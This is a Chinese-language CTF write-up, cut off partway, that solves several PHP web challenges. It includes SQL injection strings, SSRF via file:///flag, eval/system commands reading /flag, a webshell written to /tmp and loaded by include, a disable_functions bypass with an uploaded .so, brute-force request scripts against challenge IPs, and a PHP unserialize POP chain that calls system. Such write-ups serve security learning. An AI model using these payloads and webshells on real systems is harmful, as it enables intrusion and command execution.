WEB假的签到题目提示前往robots.txt查看 利用php中md5函数的特性,在PHP中,MD5是不能处理数组的,md5(数组)会返回null,所以md5($phpp[])==null,md5($hphh[])==null 因此传参phpp[]=1&amp;hphh[]=2,得到flagctf{r0bots_1s_g00d} 世界上最简单的后门 先利用eval执行系统命令,对系统内的所有flag进行扫描system(&quot;find / | grep flag&quot;); 再利用eval执行系统命令,对/flag进行查看system(&quot;cat /flag&quot;); 得到flagctf{gOoo0od} Let’s play a simple game again Get传参Xp0int=666 Post传参Xp0int=JoinUs 御剑爆后台,得到部分源码 1234567$GetIPs = GetIP();$cookie = base64_decode(getallheaders()['Cookie']);if ($GetIPs !== &quot;127.0.0.1&quot; || $cookie !== 'admin=1'){ die(&quot;What's your problems? You are not admin!&quot;);}else{ echo 'Welcome admin! Here is your flag:'.$flag;} 添加XFF头指向127.0.0.1并将cookie中的base64编码后得到的admin=0修改为admin=1并重新base64编码 得到flagctf{Have_4_n1ce_c0mpetition!} babyssrf 随手传个参数url=file:///flag(果然baby…) 得到flagctf{ssrf_1s_soooo_fun} babysql 基于字符型的SQL注入,关键在于单引号的闭合 1' order by 1# ' or 1=1;show tables;# ' or 1=1;show tables;show columns from flag;# 得到flagctf{enjoy_Sq1i11_qu3ryy} lottery_revenge查看抽奖界面的源代码,发现其无法正常抽奖同时发现其请求的是data.php 查看data.php $_POST['admin_key']==$_SESSION['key']存在弱比较,将admin_key传空值,即可正常进行抽奖 12345678910111213141516import urllibimport urllib2import jsonimport timedata={'admin_key':''}data_urlencode = urllib.urlencode(data)requrl = &quot;http://42.194.147.119:15326/data.php&quot;req = urllib2.Request(url = requrl,data = data_urlencode)while 1: res_data = urllib2.urlopen(req) res = res_data.read() js=json.loads(res[428:]) time.sleep(0.01) if js[&quot;angle&quot;]&lt;195 and js[&quot;angle&quot;]&gt;165: print(js[&quot;flag&quot;]) break 跑了差不多3分钟才出结果(老非酋了… ctf{The_next_step_is_in_the_real_f1ag_is_h3re.php} 打开the_real_f1ag_is_h3re.php 发现采用的是mt_rand(),利用php的随机种子数泄露之后就能够利用该种子数来预测序列 可以根据mt_rand的值对mt_srand的seed进行反推,去网上抄了个jio本 12345678910&lt;?php$str = &quot;1mV7aOQMUrz&quot;;$randStr = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;;for($i=0;$i&lt;strlen($str);$i++){ $pos = strpos($randStr,$str[$i]); echo $pos.&quot; &quot;.$pos.&quot; &quot;.&quot;0 &quot;.(strlen($randStr)-1).&quot; &quot;;}echo &quot;
&quot;;?&gt; 得到的结果为 53 53 0 61 12 12 0 61 47 47 0 61 59 59 0 61 0 0 0 61 40 40 0 61 42 42 0 61 38 38 0 61 46 46 0 61 17 17 0 61 25 25 0 61 用https://www.openwall.com/php_mt_seed/工具(下载4.0版)进行爆破(在虚拟机貌似用不了AVX512进行加速,所以丢服务器上跑了) seed为384211261 根据seed将整个str算出来 1234567891011121314&lt;?php$str = '';$all_alpha = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;;mt_srand(384211261);$flag_len = 30;for ( $i = 0; $i &lt; $flag_len; $i++ ){ $str.=substr($all_alpha, mt_rand(0, strlen($all_alpha) - 1), 1); }echo $str?&gt; str1mV7aOQMUrzFAb3zhexXWF6RGqU10B 得到flagctf{mt_rand_is_s0_weak_and_y0u_can_bre4k} 又一个后门发现执行不了命令 /readflag 目标应该是执行/readflag 首先看禁用函数,可知exec全禁 1pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,system,exec,shell_exec,popen,proc_open,passthru,link,symlink,syslog,ld,mb_send_mail 对当前目录进行扫描c=var_dump(scandir(getcwd())); 得到 1array(4) { [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(10) &quot;index.html&quot; [3]=&gt; string(9) &quot;index.php&quot; } 对根目录进行扫描c=var_dump(scandir(&quot;/&quot;)); 得到 1array(25) { [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(10) &quot;.dockerenv&quot; [3]=&gt; string(3) &quot;bin&quot; [4]=&gt; string(4) &quot;boot&quot; [5]=&gt; string(3) &quot;dev&quot; [6]=&gt; string(3) &quot;etc&quot; [7]=&gt; string(4) &quot;flag&quot; [8]=&gt; string(4) &quot;home&quot; [9]=&gt; string(3) &quot;lib&quot; [10]=&gt; string(5) &quot;lib64&quot; [11]=&gt; string(5) &quot;media&quot; [12]=&gt; string(3) &quot;mnt&quot; [13]=&gt; string(3) &quot;opt&quot; [14]=&gt; string(4) &quot;proc&quot; [15]=&gt; string(8) &quot;readflag&quot; [16]=&gt; string(4) &quot;root&quot; [17]=&gt; string(3) &quot;run&quot; [18]=&gt; string(4) &quot;sbin&quot; [19]=&gt; string(3) &quot;srv&quot; [20]=&gt; string(8) &quot;start.sh&quot; [21]=&gt; string(3) &quot;sys&quot; [22]=&gt; string(3) &quot;tmp&quot; [23]=&gt; string(3) &quot;usr&quot; [24]=&gt; string(3) &quot;var&quot; } 尝试对readflag进行读取,康康有没有有效信息c=var_dump(show_source(&quot;/readflag&quot;)); readflag主要进行flag的读取,猜测flag不能直接读 构造一句话进行上传(这里有点忘了,做题的时候可以,复现的时候有时可以有时不行,可能是做题的时候搭了便车??) c=var_dump(fputs(fopen(&quot;/tmp/shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval(&quot;)); c=var_dump(fputs(fopen(&quot;/tmp/shell.php&quot;,&quot;a&quot;),&quot;$&quot;)); c=var_dump(fputs(fopen(&quot;/tmp/shell.php&quot;,&quot;a&quot;),&quot;_POST['b']);?&gt;&quot;)); 分开三份上传,貌似存在关键词过滤 123456789101112131415import urllibimport urllib2import timedata={'c':'var_dump(include(&quot;/tmp/shell.php&quot;));'}data_urlencode = urllib.urlencode(data)requrl = &quot;http://42.194.147.119:20334/index.php&quot;req = urllib2.Request(url = requrl,data = data_urlencode)'''res_data = urllib2.urlopen(req)res = res_data.read()print res[:418]'''while 1: res_data = urllib2.urlopen(req) time.sleep(0.1) 使用蚁剑进行连接 发现终端无法使用 参考这篇文章进行攻击 通过蚁剑将bypass.so文件和bypass_disablefunc.php文件上传到/tmp目录下 构造payload来执行/readflag cmd=/readflag&amp;outpath=/tmp/flag.txt&amp;sopath=/tmp/bypass_disablefunc_x64.so 得到flagctf{bypass_d1s@ble_Functi0n_1s_s0_3z} P.S 做完后清除自己的文件,顺手搅下屎(逃 P.S.S 这道题我拿的是二血,拿三血的老哥在做完题后貌似没有清理文件,然后这题就变成了/tmp/flag.txt的读取题… unserialize题目源代码如下 12345678910111213141516171819202122232425262728293031323334&lt;?phphighlight_file(__FILE__);class A{ public $data; public function __destruct() { $this-&gt;data-&gt;close(); }}class B{ public $cache; public function getit($key){ if (isset($this-&gt;cache[$key])){ return $this-&gt;cache[$key]; } } public function __call($method, $args) { return call_user_func_array($this-&gt;getit($method), $args); }}class C{ public $evil,$arggg; public function evallll(){ call_user_func($this-&gt;evil,$this-&gt;arggg); }}unserialize($_GET['sssssss']); POP链的构造方法如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?php#highlight_file(__FILE__);class A{ public $data; public function __construct() { $this-&gt;data=new B(); $this-&gt;data-&gt;cache=array(&quot;close&quot;=&gt;array($c=new C,&quot;evallll&quot;)); #默认情况下__call函数的method为close,但是B中有一个getit函数,可以构造键值对,让close指向C中的evallll并进行C的实例化 $c-&gt;evil=&quot;system&quot;; $c-&gt;arggg=&quot;find / | grep flag&quot;; } public function __destruct()#类销毁时调用$this-&gt;data-&gt;close,而B中没有close这个函数,因此可以进入__call函数 { $this-&gt;data-&gt;close(); }}class B{ public $cache; public function getit($key){ if (isset($this-&gt;cache[$key])){ return $this-&gt;cache[$key]; } } public function __call($method, $args)#在对象中调用一个不可访问方法时,__call()会被调用。 { #echo $this-&gt;getit($method).&quot;

&quot;; return call_user_func_array($this-&gt;getit($method), $args); }}class C{ public $evil,$arggg; public function evallll(){ #echo &quot;123456789

